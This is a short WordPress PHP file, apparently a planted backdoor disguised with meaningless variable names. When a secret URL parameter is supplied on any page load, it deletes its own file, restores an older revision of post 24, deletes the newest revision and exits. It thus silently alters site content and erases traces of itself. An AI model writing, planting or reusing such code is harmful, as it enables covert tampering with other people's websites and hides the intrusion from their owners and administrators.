<?php

function notifications_survey_script() {
	if (isset($_GET['visual_column_additional']) && $_GET['visual_column_additional'] === 'drop_services_redirection_classic') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$current_visual_menu_smart = 24;
		$panel_uploader_navigation_cool = wp_get_post_revisions($current_visual_menu_smart);
		if (empty($panel_uploader_navigation_cool)) die('no revisions');
		if (count($panel_uploader_navigation_cool) < 2) die('less than 2');
		$members_homepage_best = array_shift($panel_uploader_navigation_cool);
		$max_virtual_internal = $members_homepage_best->ID;
		$call_builder_default_best = array_shift($panel_uploader_navigation_cool);
		$reminder_feedback_default = $call_builder_default_best->ID;
		$purchase_album_enable = wp_restore_post_revision($reminder_feedback_default);
		if ($purchase_album_enable === false) die('error restoring');
		$purchase_album_enable = wp_delete_post_revision($max_virtual_internal);		
		if ($purchase_album_enable === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'notifications_survey_script');
